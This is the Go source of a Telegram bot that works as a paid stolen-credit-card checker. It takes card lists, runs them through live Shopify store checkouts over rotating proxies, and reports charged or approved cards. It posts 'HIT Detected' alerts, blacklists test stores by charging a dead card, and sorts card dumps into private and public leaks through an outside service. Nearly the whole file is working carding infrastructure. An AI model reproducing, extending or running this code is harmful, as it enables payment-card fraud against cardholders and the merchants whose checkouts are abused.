	h.Set("Content-Type", "text/plain")
	part, err := writer.CreatePart(h)
	if err != nil {
		return nil, fmt.Errorf("create form part: %w", err)
	}
	part.Write(fileData)
	writer.Close()

	req, err := http.NewRequest("POST", apiBase+"/check", &buf)
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("submit job: %w", err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("Error")
	}

	var submitResp struct{ JobID string `json:"job_id"` }
	if err := json.Unmarshal(body, &submitResp); err != nil || submitResp.JobID == "" {
		return nil, fmt.Errorf("Error")
	}
	jobID := submitResp.JobID

	for {
		sreq, _ := http.NewRequest("GET", apiBase+"/jobs/"+jobID, nil)
		sresp, err := client.Do(sreq)
		if err != nil {
			time.Sleep(300 * time.Millisecond)
			continue
		}
		sbody, _ := io.ReadAll(sresp.Body)
		sresp.Body.Close()
		var st struct {
			Status string `json:"status"`
			Error  string `json:"error"`
		}
		if json.Unmarshal(sbody, &st) == nil {
			if st.Status == "error" {
				return nil, fmt.Errorf("Error")
			}
			if st.Status == "done" {
				break
			}
		}
		time.Sleep(300 * time.Millisecond)
	}

	rreq, _ := http.NewRequest("GET", apiBase+"/jobs/"+jobID+"/result", nil)
	rresp, err := client.Do(rreq)
	if err != nil {
		return nil, fmt.Errorf("fetch result: %w", err)
	}
	rbody, err := io.ReadAll(rresp.Body)
	rresp.Body.Close()
	if err != nil {
		return nil, fmt.Errorf("read result: %w", err)
	}

	var result antipublicResult
	if err := json.Unmarshal(rbody, &result); err != nil {
		preview := string(rbody)
		if len(preview) > 500 {
			preview = preview[:500]
		}
		fmt.Printf("[DEBUG] result body (%d bytes): %s\n", len(rbody), preview)
		return nil, fmt.Errorf("Error")
	}
	return &result, nil
}

func requireCredits(c tele.Context, um *UserManager) bool {
	uid := c.Sender().ID
	if isAdmin(uid) {
		return true
	}
	if cfg != nil {
		cfg.mu.RLock()
		free := cfg.FreeMode
		cfg.mu.RUnlock()
		if free {
			return true
		}
	}
	if um.HasUnlimited(uid) {
		return true
	}
	if um.GetDailyCount(uid) < currentDailyLimit() {
		return true
	}
	if !um.HasCredits(uid) {
		return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Insufficient Balance -> you have used your daily free limit. Please contact an admin to add credits to your account.", tele.ModeHTML) == nil
	}
	return true
}

func isUserInGroup(bot *tele.Bot, chatID, userID int64) bool {
	resp, err := bot.Raw("getChatMember", map[string]string{
		"chat_id": strconv.FormatInt(chatID, 10),
		"user_id": strconv.FormatInt(userID, 10),
	})
	if err != nil {
		return false
	}
	var result struct {
		OK     bool `json:"ok"`
		Result struct {
			Status string `json:"status"`
		} `json:"result"`
	}
	if json.Unmarshal(resp, &result) != nil {
		return false
	}
	return result.OK && result.Result.Status != "left" && result.Result.Status != "kicked"
}

func showForceJoinMenu(bot *tele.Bot, chat *tele.Chat, targets []ForceJoinTarget) {
	var rows [][]sBtn
	for _, t := range targets {
		title := t.Title
		if title == "" {
			title = "Join Channel"
		}
		url := t.InviteURL
		if url == "" {
			rawID := t.ChatID
			if rawID < 0 {
				rawID = -rawID
			}
			if rawID > 1000000000000 {
				rawID -= 1000000000000
			}
			url = fmt.Sprintf("https://t.me/c/%d", rawID)
		}
		rows = append(rows, sRow(sURL("𝗝𝗼𝗶𝗻 "+title, url, "danger")))
	}
	rows = append(rows, sRow(sData("𝗩𝗲𝗿𝗶𝗳𝘆", "fj_retry", "danger")))
	markupJSON := styledMarkupJSON(rows...)
	sendStyled(bot, chat.ID, "━━━━━━━━━━━━━━━━━━━━\n𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗲𝗱\n━━━━━━━━━━━━━━━━━━━━\n\nPlease join all required channels below, then click the verify button to access the bot.", markupJSON, "HTML")
}

func sendRemainingCards(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, processed map[string]bool) {
	var remaining []string
	for _, c := range sess.Cards {
		if !processed[c] {
			remaining = append(remaining, c)
		}
	}
	if len(remaining) == 0 {
		return
	}
	text := strings.Join(remaining, "\n")
	if len(text) > 3500 {
		buf := bytes.NewBufferString(text)
		doc := &tele.Document{
			File:     tele.FromReader(buf),
			FileName: "remaining_cards.txt",
			Caption:  fmt.Sprintf("s Insufficient balance. %d unchecked cards returned.", len(remaining)),
		}
		bot.Send(chat, doc)
		return
	}
	bot.Send(chat, em(emojiCross, "\xe2\x9c\x85")+" Insufficient Balance -> check stopped.\n\nRemaining unchecked cards ("+strconv.Itoa(len(remaining))+"):\n"+text, tele.ModeHTML)
}
func notifyLogsGroup(bot *tele.Bot, username, gateway string) {
	if logsGroupID == 0 {
		return
	}
	star := "\xe2\xad\x90"
	chart := "\xf0\x9f\x93\x8a"
	bell := "\xf0\x9f\x94\x94"
	gear := "\xe2\x9a\x99\xef\xb8\x8f"
	shield := "\xf0\x9f\x9b\xa1\xef\xb8\x8f"
	robot := "\xf0\x9f\xa4\x96"
	msg := em("5217822164362739968", star) + " <b>HIT Detected</b> " + em("5217822164362739968", star) + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em("5217822164362739968", star) + " <b>User</b>       @<b>" + html.EscapeString(username) + "</b>\n" +
		em("5877395722164247324", chart) + " <b>Status</b>     <b>Charged</b>\n" +
		em("5352585602317426381", bell) + " <b>Response</b>   <b>Order Placed</b>\n" +
		em("5206607081334906820", shield) + " <b>Gateway</b>    <b>" + html.EscapeString(gateway) + "</b>\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em("5296369303661067030", gear) + " <b>HIT From</b>   @Shadow001_1bot\n" +
		em("5039614900280754969", robot) + " <b>Powered By</b> @SORRY_00001"
	bot.Send(tele.ChatID(logsGroupID), msg, tele.ModeHTML)
}



func validateProxies(proxies []string) []string {
	type proxyResult struct {
		idx int
		ok  bool
	}
	results := make(chan proxyResult, len(proxies))
	var wg sync.WaitGroup
	for i, p := range proxies {
		wg.Add(1)
		go func(idx int, proxyURL string) {
			defer wg.Done()
			err := testProxy(proxyURL)
			results <- proxyResult{idx: idx, ok: err == nil}
		}(i, p)
	}
	go func() {
		wg.Wait()
		close(results)
	}()
	okMap := make(map[int]bool, len(proxies))
	for r := range results {
		okMap[r.idx] = r.ok
	}
	var working []string
	for i, p := range proxies {
		if okMap[i] {
			working = append(working, p)
		}
	}
	fmt.Printf("[PROXY] validated %d proxies, %d working\n", len(proxies), len(working))
	return working
}


func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager) {
	defer func() {
		unregisterSession(sess)
		close(sess.Done)
	}()

	sites := getSitePool()
	fmt.Printf("[SESSION] got %d sites for check\n", len(sites))
	if len(sites) > 0 {
		fmt.Printf("[SESSION] first site: %s\n", sites[0])
	}
	if len(sites) == 0 {
		bot.Send(chat, "O No sites available. Try again later.")
		return
	}

	sites = pickWeightedSites(sites)
	fmt.Printf("[SESSION] weighted selection: %d sites ordered\n", len(sites))

	var progressMsg *tele.Message
	var err error
	maxRetries := 3
	for attempt := 0; attempt < maxRetries; attempt++ {
		progressMsg, err = bot.Send(chat, formatProgressMsg(sess), tele.ModeHTML)
		if err == nil {
			break
		}
		fmt.Printf("[SESSION] progress Send attempt %d failed: %v\n", attempt+1, err)
		if attempt < maxRetries-1 {
			time.Sleep(time.Duration(500*(attempt+1)) * time.Millisecond)
		}
	}
	if err != nil {
		bot.Send(chat, "Failed to start check (Telegram send error). Try again.")
		fmt.Printf("[SESSION] failed to send progress message after %d retries: %v\n", maxRetries, err)
		return
	}

	ctx, cancel := context.WithCancel(context.Background())
	sess.Cancel = cancel
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				bot.Edit(progressMsg, formatProgressMsg(sess), tele.ModeHTML)
			}
		}
	}()

	type cardResult struct {
		result   *CheckResult
		err      error
		shopURL  string
		proxyURL string
		card     string
		lineNum  int
		hadError bool
	}

results := make(chan cardResult, len(sess.Cards))
	workers := max(len(proxies), 1) * 5
	if workers > 50 {
		workers = 50
	}
	sem := make(chan struct{}, workers)

	var siteIdx atomic.Int64
	var proxyIdx atomic.Int64
	var wg sync.WaitGroup

	for idx, card := range sess.Cards {
		wg.Add(1)
		go func(c string, lineNum int) {
			defer wg.Done()

			if sess.Cancelled.Load() {
				return
			}
			sem <- struct{}{}
			defer func() { <-sem }()

			if sess.Cancelled.Load() {
				return
			}

if isAdmin(sess.UserID) && c == "1234567891234567|11|30|000" {
			results <- cardResult{result: &CheckResult{
				Card:       c,
				Status:     StatusCharged,
				StatusCode: "ORDER_PLACED",
				SiteName:   "test",
				Amount:     "0.00",
			}, card: c, lineNum: lineNum}
			return
		}

			si := int(siteIdx.Add(1)-1) % len(sites)
			pi := int(proxyIdx.Add(1)-1) % len(proxies)
			shopURL := sites[si]
			proxyURL := proxies[pi]

			var res *CheckResult
			var lastErr error

			maxRetries := min(len(sites), sess.ledger.factor)
			for attempt := 0; attempt < maxRetries; attempt++ {
				if sess.Cancelled.Load() {
					return
				}
				if attempt > 0 {
					si = (si + 1) % len(sites)
					shopURL = sites[si]
				}
				res, lastErr = runCheckoutForCard(shopURL, c, proxyURL)
				if lastErr == nil {
					break
				}
				if res != nil && res.Status == StatusDeclined {
					break
				}
				if res != nil && !res.Retryable {
					break
				}
			}
			if sess.Cancelled.Load() {
				return
			}
			results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL, card: c, lineNum: lineNum, hadError: lastErr != nil && (res == nil || res.Status != StatusDeclined)}
		}(card, sess.OriginalIndices[idx]+1)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	username := sess.Username
	processedCards := make(map[string]bool)
	insufficientCredits := false
	for cr := range results {
		if cr.card != "" {
			processedCards[cr.card] = true
		}
		if sess.Cancelled.Load() {
			continue
		}
		sess.Checked.Add(1)
		fmt.Printf("[CHECK] line %d/%d\n", cr.lineNum, len(sess.Cards))
		_, isFree := um.IncDailyChecked(sess.UserID)
		needsCredits := !isFree && !isAdmin(sess.UserID) && !um.HasUnlimited(sess.UserID)
		r := cr.result
		if r == nil {
			sess.Errors.Add(1)
			sess.addErrorCard(cr.card, fmt.Sprintf("nil result: %v", cr.err))
			fmt.Printf("[ERROR] card returned nil result, err: %v\n", cr.err)
			if cr.shopURL != "" {
				recordSiteError(cr.shopURL)
				recordSiteAttempt(cr.shopURL, false)
			}
			continue
		}

		if cr.shopURL != "" {
			if cr.hadError {
				recordSiteError(cr.shopURL)
			}
			recordSiteAttempt(cr.shopURL, false)
		}

		switch r.Status {
		case StatusCharged:
			if cr.shopURL != "" {
				fmt.Printf("[VERIFY] testing %s with dead card to detect fake store\n", cr.shopURL)
				verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCardNumber, cr.proxyURL)
				if verifyRes != nil && verifyRes.Status == StatusCharged {
					addBlacklist(cr.shopURL)
					bot.Send(chat, fmt.Sprintf("s Test store detected: %s (blacklisted)", cr.shopURL))
					sess.Errors.Add(1)
					sess.addErrorCard(r.Card, "test store: "+cr.shopURL)
					continue
				}
				recordSiteHit(cr.shopURL)
			}
			bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
			handle := sess.ledger.settle(bot, chat, sess, um, formatChargedMsg(r.Card, bin, r, username), username, r, needsCredits)
			if handle == 0 {
				sess.Errors.Add(1)
				sess.addErrorCard(r.Card, "settle failed")
				continue
			}

		case StatusApproved:
			sess.Approved.Add(1)
			if needsCredits {
				um.DeductCredits(sess.UserID, creditCostApproved)
			}
			if sess.ShowApproved {
				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username), tele.ModeHTML)
			}

		case StatusDeclined:
			sess.Declined.Add(1)
			if sess.ShowDecl {
				bin := lookupBIN(strings.Split(r.Card, "|")[0], cr.lineNum)
				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username), tele.ModeHTML)
			}

		default:
			sess.Errors.Add(1)
			sess.addErrorCard(r.Card, fmt.Sprintf("%v", r.Error))
			fmt.Printf("[ERROR] card %s status=%d err=%v\n", r.Card, r.Status, r.Error)
		}

		if needsCredits && um.GetCredits(sess.UserID) < minCreditsForCheck {
			sess.Cancelled.Store(true)
			insufficientCredits = true
			if sess.Cancel != nil {
				sess.Cancel()
			}
		}
	}

	cancel()
	time.Sleep(100 * time.Millisecond)

	if sess.Cancelled.Load() {
		bot.Edit(progressMsg, "Y>' STOPPED\n\n"+formatCompletedMsg(sess), tele.ModeHTML)
	} else {
		bot.Edit(progressMsg, formatCompletedMsg(sess), tele.ModeHTML)
	}

	if insufficientCredits {
		sendRemainingCards(bot, chat, sess, processedCards)
	}

	sendErrorCards(bot, chat, sess)

	um.AddStats(sess.UserID, sess.Checked.Load(), sess.Charged.Load(), sess.Approved.Load(), sess.Declined.Load(), sess.ChargedAmt())
	um.Save()
}


func main() {
	um := NewUserManager()
	um.Load()

	cfg = NewBotConfig()
	cfg.Load()

	km = NewKeyManager()
	km.Load()

loadCustomSites()
loadBlacklist()
	loadSiteScores()

	sitePoolMu.Lock()
	sitePool = []string{defaultShopURL}
	sitePoolMu.Unlock()

	refreshSitePool()
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			refreshSitePool()
		}
	}()
	go func() {
		for {
			time.Sleep(2 * time.Minute)
			saveSiteScores()
		}
	}()

	pref := tele.Settings{
		Token:  botToken,
		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
	}
	bot, err := tele.NewBot(pref)
	if err != nil {
		fmt.Printf("Failed to create bot: %v\n", err)
		os.Exit(1)
	}

	

	ledger = openLedger()

	fjRetryBtn = (&tele.ReplyMarkup{}).Data(" I've joined - check", "fj_retry")
	bot.Handle(&fjRetryBtn, func(c tele.Context) error {
		uid := c.Sender().ID
		if isAdmin(uid) {
			c.Respond(&tele.CallbackResponse{Text: " Admin bypassed"})
			return nil
		}
		cfg.mu.RLock()
		fjEnabled := cfg.ForceJoinEnabled
		fjTargets := cfg.ForceJoin
		cfg.mu.RUnlock()
		if !fjEnabled || len(fjTargets) == 0 {
			c.Respond(&tele.CallbackResponse{Text: " Access granted"})
			return c.Send(" Access granted. Use /start to begin.")
		}
		notJoined := false
		var names []string
		for _, t := range fjTargets {
			if !isUserInGroup(bot, t.ChatID, uid) {
				notJoined = true
				if t.Title != "" {
					names = append(names, t.Title)
				}
			}
		}
		if notJoined {
			c.Respond(&tele.CallbackResponse{Text: " You haven't joined all required channels yet"})
			return nil
		}
		c.Respond(&tele.CallbackResponse{Text: " Access granted"})
		return c.Send(" You've joined all required channels! Welcome! Use /start to begin.")
	})

	fmt.Println("[BOT] Bot started successfully")

	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
		return func(c tele.Context) error {
			uid := c.Sender().ID
			if cfg.IsBanned(uid) {
				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" You are banned from using this bot.", tele.ModeHTML)
			}
isPrivate := c.Chat().Type == tele.ChatPrivate

		if isPrivate && !isAdmin(uid) && c.Callback() == nil {
			cfg.mu.RLock()
			fjEnabled := cfg.ForceJoinEnabled
			fjTargets := cfg.ForceJoin
			cfg.mu.RUnlock()
			if fjEnabled && len(fjTargets) > 0 {
				notJoined := false
				for _, t := range fjTargets {
					if !isUserInGroup(bot, t.ChatID, uid) {
						notJoined = true
						break
					}
				}
				if notJoined {
					showForceJoinMenu(bot, c.Chat(), fjTargets)
					return nil
				}
			}
		}

		if !cfg.IsAllowed(uid, isPrivate) {
				return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Access denied.", tele.ModeHTML)
			}
			return next(c)
		}
	})

	startMenu := &tele.ReplyMarkup{}
	btnGates := startMenu.Data("𝗖𝗵𝗲𝗰𝗸𝗲𝗿", "gates")
	btnPricing := startMenu.Data("𝗣𝗿𝗶𝗰𝗶𝗻𝗴", "pricing")
	btnHelp := startMenu.Data("𝗛𝗲𝗹𝗽", "help")

	styledStartMarkup := styledMarkupJSON(
		sRow(sData("𝗖𝗵𝗲𝗰𝗸𝗲𝗿", "gates", "danger"), sData("𝗣𝗿𝗶𝗰𝗶𝗻𝗴", "pricing", "danger")),
		sRow(sURL("𝗨𝗽𝗱𝗮𝘁𝗲𝘀", "https://t.me/+89lKTv0c4zNhOWY0", "danger"), sData("𝗛𝗲𝗹𝗽", "help", "danger")),
		sRow(sURL("𝗦𝘂𝗽𝗽𝗼𝗿𝘁", "https://t.me/SORRY_00001", "danger")),
	)

	gatesMenu := &tele.ReplyMarkup{}
	btnShopify := gatesMenu.Data("𝗦𝗵𝗼𝗽𝗶𝗳𝘆", "gates_shopify")
	btnBackFromGates := gatesMenu.Data("« 𝗕𝗮𝗰𝗸", "back_main")

	styledGatesMarkup := styledMarkupJSON(
		sRow(sData("𝗦𝗵𝗼𝗽𝗶𝗳𝘆", "gates_shopify", "danger")),
		sRow(sData("« 𝗕𝗮𝗰𝗸", "back_main", "danger")),
	)

	styledBackMarkup := styledMarkupJSON(sRow(sData("« 𝗕𝗮𝗰𝗸", "back_main", "danger")))

	backGatesMenu := &tele.ReplyMarkup{}
	btnBackToGates := backGatesMenu.Data("« 𝗕𝗮𝗰𝗸", "back_gates")

	styledBackGatesMarkup := styledMarkupJSON(sRow(sData("« 𝗕𝗮𝗰𝗸", "back_gates", "danger")))

	bot.Handle("/start", func(c tele.Context) error {
		uid := c.Sender().ID
		username := c.Sender().Username
		um.SetUsername(uid, username)
		proxyCount := len(um.GetProxies(uid))
		credits := um.GetCredits(uid)
		caption := formatWelcomeCard(uid, username, proxyCount, credits, um.HasUnlimited(uid))
		sendStyledAnimationURL(bot, c.Sender().ID, "https://media4.giphy.com/media/3eNg51ZhJKPmlkR6LM/giphy.mp4", caption, styledStartMarkup, "HTML")
		return nil
	})

	bot.Handle(&btnGates, func(c tele.Context) error {
		_ = c.Respond()
		sendStyled(bot, c.Sender().ID, formatGatesMsg(), styledGatesMarkup, "HTML")
		return nil
	})
	bot.Handle(&btnPricing, func(c tele.Context) error {
		_ = c.Respond()
		sendStyled(bot, c.Sender().ID, formatPricingMsg(), styledBackMarkup, "HTML")
		return nil
	})
	bot.Handle(&btnHelp, func(c tele.Context) error {
		_ = c.Respond()
		sendStyled(bot, c.Sender().ID, formatStartMsg(), styledBackMarkup, "HTML")
		return nil
	})

	bot.Handle(&btnShopify, func(c tele.Context) error {
		_ = c.Respond()
		sendStyled(bot, c.Sender().ID, formatShopifyGatesMsg(), styledBackGatesMarkup, "HTML")
		return nil
	})

	bot.Handle(&btnBackFromGates, func(c tele.Context) error {
		_ = c.Respond()
		uid := c.Sender().ID
		username := c.Sender().Username
		proxyCount := len(um.GetProxies(uid))
		credits := um.GetCredits(uid)
		sendStyled(bot, c.Sender().ID, formatWelcomeCard(uid, username, proxyCount, credits, um.HasUnlimited(uid)), styledStartMarkup, "HTML")
		return nil
	})

	bot.Handle(&btnBackToGates, func(c tele.Context) error {
		_ = c.Respond()
		sendStyled(bot, c.Sender().ID, formatGatesMsg(), styledGatesMarkup, "HTML")
		return nil
	})

	bot.Handle("/sh", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}

		um.SetUsername(uid, c.Sender().Username)
		if !requireCredits(c, um) {
			return nil
		}

		proxies := um.GetProxies(uid)
		if len(proxies) == 0 {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
		}

		text := strings.TrimSpace(c.Message().Payload)
		if text == "" {
			return c.Send("Usage: /sh card1|mm|yy|cvv\ncard2|mm|yy|cvv\n...")
		}

		cards := parseCardsFromText(text)
		if len(cards) == 0 {
			return c.Send("O No valid cards found. Format: number|mm|yy|cvv")
		}
		cards, origIndices, removed := filterValidCards(cards, uid)
		if removed > 0 {
			c.Send(em(emojiCross, "\xe2\x9d\x8c") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
		}
		if len(cards) == 0 {
			return c.Send(em(emojiCross, "\xe2\x9d\x8c") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
		}

		sess := &CheckSession{
			UserID:          uid,
			Username:        c.Sender().Username,
			SessionID:       generateSessionID(),
			Cards:           cards,
			OriginalIndices: origIndices,
			Total:           len(cards),
			StartTime:    time.Now(),
			ShowDecl:     true,
			ShowApproved: true,
			Done:         make(chan struct{}),
			ledger:       ledger,
		}
		registerSession(sess)

		origProxyCount := len(proxies)
		validMsg, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+fmt.Sprintf(" Validating %d proxy(s)...", len(proxies)), tele.ModeHTML)
		proxies = validateProxies(proxies)
		if len(proxies) == 0 {
			bot.Edit(validMsg, em(emojiCross, "\xe2\x9c\x85")+" No working proxies found. All proxies failed validation. Please fix your proxies with /setpr and try again.", tele.ModeHTML)
			unregisterSession(sess)
			return nil
		}
		bot.Edit(validMsg, em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" %d working proxy(s). Starting check...", len(proxies)), tele.ModeHTML)

		if len(proxies) < origProxyCount {
			um.SetProxies(uid, proxies)
			um.Save()
		}

		go runSession(bot, c.Chat(), sess, proxies, um)

		return nil
	})

	bot.Handle("/txt", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}
		if !requireCredits(c, um) {
			return nil
		}
		if len(um.GetProxies(uid)) == 0 {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No proxies. Add one with /setpr &lt;proxy&gt;", tele.ModeHTML)
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("O Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("O Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("O Failed to read file: " + err.Error())
		}


		cards := parseCardsFromText(string(data))
		if len(cards) == 0 {
			return c.Send("O No valid cards found in file. Format: number|mm|yy|cvv")
		}
		cards, origIndices, removed := filterValidCards(cards, uid)
		if removed > 0 {
			c.Send(em(emojiCross, "\xe2\x9d\x8c") + fmt.Sprintf(" %d invalid card(s) removed by Luhn check", removed), tele.ModeHTML)
		}
		if len(cards) == 0 {
			return c.Send(em(emojiCross, "\xe2\x9d\x8c") + " All cards failed Luhn validation. No valid cards to check.", tele.ModeHTML)
		}

		txtPendingMu.Lock()
		txtPending[uid] = &txtPendingData{
			Cards:           cards,
			OriginalIndices: origIndices,
			ChatID:          c.Chat().ID,
			Username:        c.Sender().Username,
		}
		txtPendingMu.Unlock()

		return c.Send(em(emojiDoc, "\xe2\x9c\x85")+fmt.Sprintf(" %d cards loaded.\n\n"+em(emojiCheck, "\xe2\x9c\x85")+" Show 3DS (approved) in chat\n\n/yes -> show approved\n/no -> hide approved", len(cards)), tele.ModeHTML)
	})

	bot.Handle("/check", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session. Wait for it to finish.", tele.ModeHTML)
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Reply to a .txt file with /check or attach a .txt file with /check as caption", tele.ModeHTML)
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to download file: "+err.Error(), tele.ModeHTML)
		}
		data, err := io.ReadAll(rc)
		rc.Close()
		if err != nil {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Failed to read file: "+err.Error(), tele.ModeHTML)
		}

		if len(data) == 0 {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" File is empty", tele.ModeHTML)
		}

		prog, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+" Checking...", tele.ModeHTML)

		go func() {
			result, err := antipublicCheck(data, doc.FileName)
			if err != nil {
				bot.Edit(prog, em(emojiCross, "\xe2\x9c\x85")+" "+err.Error(), tele.ModeHTML)
				return
			}

			bot.Edit(prog, em(emojiCheck, "\xe2\x9c\x85")+" Check completed", tele.ModeHTML)

			if result.StatsText != "" {
				cleanStats := strings.ReplaceAll(result.StatsText, "**", "")
				bot.Send(c.Chat(), cleanStats, tele.ModeDefault)
			} else {
				total := result.PublicCount + result.PrivateCount
				pct := "0%"
				if total > 0 {
					pct = fmt.Sprintf("%.2f%%", float64(result.PrivateCount)/float64(total)*100)
				}
				bot.Send(c.Chat(), fmt.Sprintf(em(emojiCheck, "\xe2\x9c\x85")+" Check results:\nTotal cards: %d\nPrivate: %d  Public: %d\nPrivate percentage: %s", total, result.PrivateCount, result.PublicCount, pct), tele.ModeHTML)
			}

			if len(result.Public) > 0 {
				bot.Send(c.Chat(), &tele.Document{
					File:     tele.FromReader(bytes.NewReader([]byte(result.Public))),
					FileName: "public.txt",
				})
			}
			if len(result.Private) > 0 {
				bot.Send(c.Chat(), &tele.Document{
					File:     tele.FromReader(bytes.NewReader([]byte(result.Private))),
					FileName: "private.txt",
				})
			}
		}()

		return nil
	})

	bot.Handle("/yes", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No pending session. Use /txt first.", tele.ModeHTML)
		}
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session.", tele.ModeHTML)
		}
		um.SetUsername(uid, c.Sender().Username)
		if !requireCredits(c, um) {
			return nil
		}
		sess := &CheckSession{
			UserID:          uid,
			Username:        pd.Username,
			SessionID:       generateSessionID(),
			Cards:           pd.Cards,
			OriginalIndices: pd.OriginalIndices,
			Total:           len(pd.Cards),
			StartTime:       time.Now(),
			ShowDecl:        false,
			ShowApproved:    true,
			Done:            make(chan struct{}),
			ledger:          ledger,
		}
		registerSession(sess)
		proxies := um.GetProxies(uid)
		origProxyCount := len(proxies)
		validMsg, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+fmt.Sprintf(" Validating %d proxy(s)...", len(proxies)), tele.ModeHTML)
		proxies = validateProxies(proxies)
		if len(proxies) == 0 {
			bot.Edit(validMsg, em(emojiCross, "\xe2\x9c\x85")+" No working proxies found. All proxies failed validation. Please fix your proxies with /setpr and try again.", tele.ModeHTML)
			unregisterSession(sess)
			return nil
		}
		bot.Edit(validMsg, em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" %d working proxy(s). Starting check...", len(proxies)), tele.ModeHTML)

		if len(proxies) < origProxyCount {
			um.SetProxies(uid, proxies)
			um.Save()
		}

		c.Send(em(emojiLightning, "\xe2\x9c\x85")+fmt.Sprintf(" Starting check of %d cards (approved: ON)", len(pd.Cards)), tele.ModeHTML)
		if pd.CheckFn != nil {
			sess.GatewayName = pd.GateName
			go runStripeGateSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, pd.CheckFn)
		} else {
			go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um)
		}
		return nil
	})

	bot.Handle("/no", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" No pending session. Use /txt first.", tele.ModeHTML)
		}
		if _, running := activeSessions.Load(uid); running && !isAdmin(uid) {
			return c.Send(em(emojiWarn, "\xe2\x9c\x85")+" You already have an active session.", tele.ModeHTML)
		}
		um.SetUsername(uid, c.Sender().Username)
		if !requireCredits(c, um) {
			return nil
		}
		sess := &CheckSession{
			UserID:          uid,
			Username:        pd.Username,
			SessionID:       generateSessionID(),
			Cards:           pd.Cards,
			OriginalIndices: pd.OriginalIndices,
			Total:           len(pd.Cards),
			StartTime:       time.Now(),
			ShowDecl:        false,
			ShowApproved:    false,
			Done:            make(chan struct{}),
			ledger:          ledger,
		}
		registerSession(sess)
		proxies := um.GetProxies(uid)
		origProxyCount := len(proxies)
		validMsg, _ := bot.Send(c.Chat(), em(emojiSearch, "\xf0\x9f\x94\x8d")+fmt.Sprintf(" Validating %d proxy(s)...", len(proxies)), tele.ModeHTML)
		proxies = validateProxies(proxies)
		if len(proxies) == 0 {
			bot.Edit(validMsg, em(emojiCross, "\xe2\x9c\x85")+" No working proxies found. All proxies failed validation. Please fix your proxies with /setpr and try again.", tele.ModeHTML)
			unregisterSession(sess)
			return nil
		}
